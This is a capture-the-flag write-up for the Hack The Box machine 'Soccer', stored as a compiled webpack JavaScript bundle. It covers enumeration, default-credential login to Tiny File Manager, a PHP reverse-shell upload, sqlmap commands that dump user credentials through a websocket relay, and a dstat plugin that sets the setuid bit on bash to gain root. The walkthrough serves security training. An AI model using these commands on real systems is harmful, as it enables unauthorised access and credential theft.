"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[849],{60601:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>a,metadata:()=>c,toc:()=>o});var i=n(74848),t=n(28453);const a={},r="Soccer",c={id:"writeups/htb/soccer/index",title:"Soccer",description:"A writeup for the machine Soccer on Hack The Box.",source:"@site/docs/writeups/htb/soccer/index.md",sourceDirName:"writeups/htb/soccer",slug:"/writeups/htb/soccer/",permalink:"/docs/writeups/htb/soccer/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/soccer/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Perfection",permalink:"/docs/writeups/htb/perfection/"},next:{title:"Cat Pictures 2",permalink:"/docs/writeups/thm/cat-pictures-2/"}},l={},o=[{value:"Footprinting",id:"footprinting",level:2},{value:"Nmap scan",id:"nmap-scan",level:3},{value:"Website analysis",id:"website-analysis",level:3},{value:"Website enumeration",id:"website-enumeration",level:3},{value:"User flag",id:"user-flag",level:2},{value:"Entering Tiny File\xa0Manager",id:"entering-tiny-filemanager",level:3},{value:"Exploiting the file upload vulnerability in\xa0Tiny",id:"exploiting-the-file-upload-vulnerability-intiny",level:3},{value:"Inside the\xa0system",id:"inside-thesystem",level:3},{value:"Second website",id:"second-website",level:3},{value:"SQLMap over websocket",id:"sqlmap-over-websocket",level:3},{value:"Running SQLmap",id:"running-sqlmap",level:3},{value:"User flag",id:"user-flag-1",level:3},{value:"Root flag",id:"root-flag",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:3},{value:"Exploiting dstat",id:"exploiting-dstat",level:3},{value:"Root flag",id:"root-flag-1",level:3}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,t.R)(),...e.components},{Gist:a,Image:r}=s;return a||p("Gist",!0),r||p("Image",!0),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.h1,{id:"soccer",children:"Soccer"}),"\n",(0,i.jsxs)(s.p,{children:["A writeup for the machine ",(0,i.jsx)(s.a,{href:"https://app.hackthebox.com/machines/Soccer",children:"Soccer"})," on Hack The Box."]}),"\n",(0,i.jsx)(r,{src:n(75464).A,width:"700"}),"\n",(0,i.jsx)(s.h2,{id:"footprinting",children:"Footprinting"}),"\n",(0,i.jsx)(s.h3,{id:"nmap-scan",children:"Nmap scan"}),"\n",(0,i.jsx)(s.p,{children:"Use nmap to scan for services."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"nmap -sS <IP>\n"})}),"\n",(0,i.jsx)(r,{src:n(90406).A}),"\n",(0,i.jsx)(s.p,{children:"We can see three services: ssh, http, and one on port 9091 used for websockets."}),"\n",(0,i.jsx)(s.h3,{id:"website-analysis",children:"Website analysis"}),"\n",(0,i.jsx)(s.p,{children:"If we look on the website there is only a simple homepage with no other links."}),"\n",(0,i.jsx)(r,{src:n(53975).A}),"\n",(0,i.jsx)(s.h3,{id:"website-enumeration",children:"Website enumeration"}),"\n",(0,i.jsx)(s.p,{children:"By enumerating the main website using gobuster we can find a subdomain called tiny."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"gobuster dir -u soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n"})}),"\n",(0,i.jsx)(r,{src:n(90223).A}),"\n",(0,i.jsx)(s.h2,{id:"user-flag",children:"User flag"}),"\n",(0,i.jsx)(s.h3,{id:"entering-tiny-filemanager",children:"Entering Tiny File\xa0Manager"}),"\n",(0,i.jsx)(s.p,{children:"During the enumeration a page is found under /tiny. There is a login but common credentials don't work."}),"\n",(0,i.jsx)(s.p,{children:'It is possible to search online for "Tiny File Manager" and the Github repository of this project is one of the first results.'}),"\n",(0,i.jsx)(s.p,{children:"There is a section in the public documentation about the default admin credentials. The second user works. It is possible to enter inside."}),"\n",(0,i.jsx)(s.p,{children:"Default credentials:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"username: user\npassword: 12345\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.a,{href:"https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management",children:"https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management"})}),"\n",(0,i.jsx)(r,{src:n(43912).A}),"\n",(0,i.jsx)(s.h3,{id:"exploiting-the-file-upload-vulnerability-intiny",children:"Exploiting the file upload vulnerability in\xa0Tiny"}),"\n",(0,i.jsx)(s.p,{children:"Because it is a php server and we can upload file, we can obtain a reverse shell by uploading something like this and executing it."}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.a,{href:"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php",children:"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"})}),"\n",(0,i.jsx)(r,{src:n(99749).A}),"\n",(0,i.jsx)(s.h3,{id:"inside-thesystem",children:"Inside the\xa0system"}),"\n",(0,i.jsx)(s.p,{children:"Once inside we can see that we have no access as the main user or the root."}),"\n",(0,i.jsx)(s.p,{children:"Also, no vulnerabilities are found with tools like LinPeas or LinEnum."}),"\n",(0,i.jsx)(s.p,{children:"By looking in the available files we can find in the nginx config that there is an additional website as soc-player.soccer.htb."}),"\n",(0,i.jsx)(r,{src:n(90536).A}),"\n",(0,i.jsx)(s.h3,{id:"second-website",children:"Second website"}),"\n",(0,i.jsx)(s.p,{children:"Once logged in the second website, there is only an input box."}),"\n",(0,i.jsx)(s.p,{children:'By trying different inputs we can see that the message "Tickets exists" is show when the query is correct and a value is found.'}),"\n",(0,i.jsx)(s.p,{children:"This is a blind sql injection vulnerability."}),"\n",(0,i.jsx)(r,{src:n(14531).A}),"\n",(0,i.jsx)(s.h3,{id:"sqlmap-over-websocket",children:"SQLMap over websocket"}),"\n",(0,i.jsx)(s.p,{children:"The vulnerable request is managed with websockets so it is not possible to use sqlmap directly."}),"\n",(0,i.jsx)(s.p,{children:"By looking to Rayhan0x01 post there is a possible solution for this."}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.a,{href:"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html",children:"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html"})}),"\n",(0,i.jsx)(s.p,{children:"We can create a middle server that receives normal GET requests by sqlmap and sent them to the websockets server and vice versa."}),"\n",(0,i.jsx)(s.p,{children:"Once the script is ready and the server up and running, we can execute sqlmap and enumerate the database."}),"\n",(0,i.jsxs)(s.p,{children:["Run it with ",(0,i.jsx)(s.code,{children:"flask run"})]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"python3 -m venv .venv\nsource .venv/bin/activate\npython3 -m pip install flask websocket\n"})}),"\n",(0,i.jsx)(a,{id:"23988dbb8c44b3885f7f488caba89414"}),"\n",(0,i.jsx)(s.h3,{id:"running-sqlmap",children:"Running SQLmap"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:'# enumerate dbs\nsqlmap -u "http://localhost:5000/?id=1" --batch --dbs\n\n# enumerate tables in app db\nsqlmap -u "http://localhost:5000/?id=1" --batch -D soccer_db --tables\n\n# enumerate credentials\nsqlmap -u "http://localhost:5000/?id=1" -D soccer_db -T accounts -C username,email,password --dump\n'})}),"\n",(0,i.jsx)(r,{src:n(14412).A}),"\n",(0,i.jsx)(s.h3,{id:"user-flag-1",children:"User flag"}),"\n",(0,i.jsx)(s.p,{children:"We can enter inside the system using ssh and the credentials found in the database. It is possible in this way to read the user flag."}),"\n",(0,i.jsx)(r,{src:n(26439).A}),"\n",(0,i.jsx)(s.h2,{id:"root-flag",children:"Root flag"}),"\n",(0,i.jsx)(s.h3,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,i.jsx)(s.p,{children:"Once inside the system for privilige escalation we can run LinPeas. Move it using ssh or by serving a directory."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"./LinPeas.sh\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.a,{href:"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS",children:"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"})}),"\n",(0,i.jsx)(s.p,{children:"In the final output of LinPeas we can see that there is a possible vulnerability with dstat."}),"\n",(0,i.jsx)(r,{src:n(89680).A}),"\n",(0,i.jsx)(s.h3,{id:"exploiting-dstat",children:"Exploiting dstat"}),"\n",(0,i.jsx)(s.p,{children:"dstat can be run as root. We could write a new plugin to make some actions like the root inside the system."}),"\n",(0,i.jsxs)(s.p,{children:["New plugins can be written inside the folder ",(0,i.jsx)(s.code,{children:"/usr/local/share/dstat"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["The filename format should be ",(0,i.jsx)(s.code,{children:"dstat_<plugin_name>.py"})," like ",(0,i.jsx)(s.code,{children:"dstat_hack.py"}),"."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-python",children:"# /usr/local/share/dstat/dstat_hack.py\nimport os\n\nos.system('chmod +s /usr/bin/bash') # setuid\n"})}),"\n",(0,i.jsx)(s.p,{children:"We can run it using this command"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sudo /usr/bin/dstat --hack\n"})}),"\n",(0,i.jsx)(s.h3,{id:"root-flag-1",children:"Root flag"}),"\n",(0,i.jsx)(s.p,{children:"Now we can run bash as root and read the flag."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"bash -p\n"})}),"\n",(0,i.jsx)(r,{src:n(55610).A})]})}function h(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}function p(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}},75464:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/banner-9bd92dc199423c8b3d3a92066c172cf6.png"},90223:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/gobuster-755d94ce232ae938f3e42f21ea449972.png"},89680:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/linpeas-a96cf2d13e8ff7c9d7da100cae44f278.png"},90536:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/nginx-6440219feec9a07b3ad57414cafcb1c3.png"},90406:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/nmap-scan-4d95c96e26f849bf10e41f67542905ec.png"},55610:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/root-64f4d01478f3e930396383e359e5d1fc.png"},14531:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/sqli-012b6e405b0ba27c85864da8ac320b15.png"},14412:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/sqlmap-54167539a2a0916da1fb8c7952a535b3.png"},43912:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/tiny-413eaca367c3b81ef28f618d5aea0120.png"},99749:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/upload-f34319ee04dc0348cd9e4c97686cae7c.png"},26439:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/user-ea2955376069033e0542ae45ab7f1678.png"},53975:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/website-0da2f1cfd41abb78357c81e3ee1e1a83.png"},28453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>c});var i=n(96540);const t={},a=i.createContext(t);function r(e){const s=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),i.createElement(a.Provider,{value:s},e.children)}}}]);